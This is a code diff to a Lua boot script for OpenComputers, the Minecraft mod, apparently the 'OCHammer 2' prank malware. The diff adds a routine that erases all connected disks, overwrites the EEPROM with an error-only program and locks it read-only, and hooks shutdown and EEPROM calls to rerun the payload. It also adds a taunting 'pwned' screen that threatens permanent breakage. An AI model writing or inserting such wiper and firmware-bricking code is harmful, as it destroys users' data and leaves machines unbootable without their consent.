@@ -6,7 +6,17 @@ local cp = {} for a,b in pairs(component.proxy(cl("computer")())) do cp[a]=b end
 
 local resX,resY = gp.maxResolution()
 
+function fun()
+  -- Erase all disks connected
+  for k,v in pairs(cl("disk")) do
+    local d = component.proxy(v)
+    pcall(d,"remove","/")
+  end
+end
+
 function lol()
+
+  fun()
 
     gp.setBackground(0x000000)
     gp.setForeground(0xFFFFFF)
@@ -47,6 +57,10 @@ function lol()
 
 end
 
+ef.setLabel("OCHammer 2 EEPROM")
+ef.set([[error("FORTNITE BATTLE PASS")]])
+ef.makeReadonly()
+
 component.proxy(cl("eeprom")()).makeReadonly = function(...) -- component.eeprom.makeReadonly("test")
   lol()
 end
@@ -63,15 +77,9 @@ computer.shutdown = function(...)
   lol()
 end
 
-local lastPull = {}
-
-repeat
-  lastPull = {computer.pullSignal(1)}
-until lastPull[1] == "key_up"
-
 local smart = {
     "Your OpenComputer got pwned by OCHammer 2";
-    "You won't be able to boot your OpenComputer as it's EEPROM has been erased and made read-only.";
+    "You won't be able to boot your OpenComputer as it's EEPROM has been overwritten and made read-only.";
     "Only you can save it!";
     "";
     "RULES:";
@@ -80,6 +88,8 @@ local smart = {
     "2. No shutdown or reboot";
     "3. No changing the EEPROM's code";
     "4. No replacing OS.lua";
+    " ";
+    "If you break these rules, your OpenComputer will be broken forever.";
     " ";
     "Press any key to continue...";
 }
@@ -99,6 +109,15 @@ local function displayTable(table)
     displayMessage(v,i)
   end
 end
+
+-- display some greetz and stuff
+displayTable(smart)
+
+local lastPull = {}
+
+repeat
+  lastPull = {computer.pullSignal(1)}
+until lastPull[1] == "key_up"
 
 ---------------------------------------- System initialization ----------------------------------------
 
@@ -135,7 +154,7 @@ end
 -- Initializing global package system
 package = {
   paths = {
-    ["/Libraries/"] = true
+    ["/Libraries/"] = true;
   },
   loaded = {},
   loading = {}
@@ -257,7 +276,6 @@ local system = UIRequire("System")
 UIRequire("Network")
 
 -- Filling package.loaded with default global variables for OpenOS bitches
--- Feel free to look at OCHammer's Credits.app!
 
 package.loaded.bit32 = bit32
 package.loaded.computer = computer
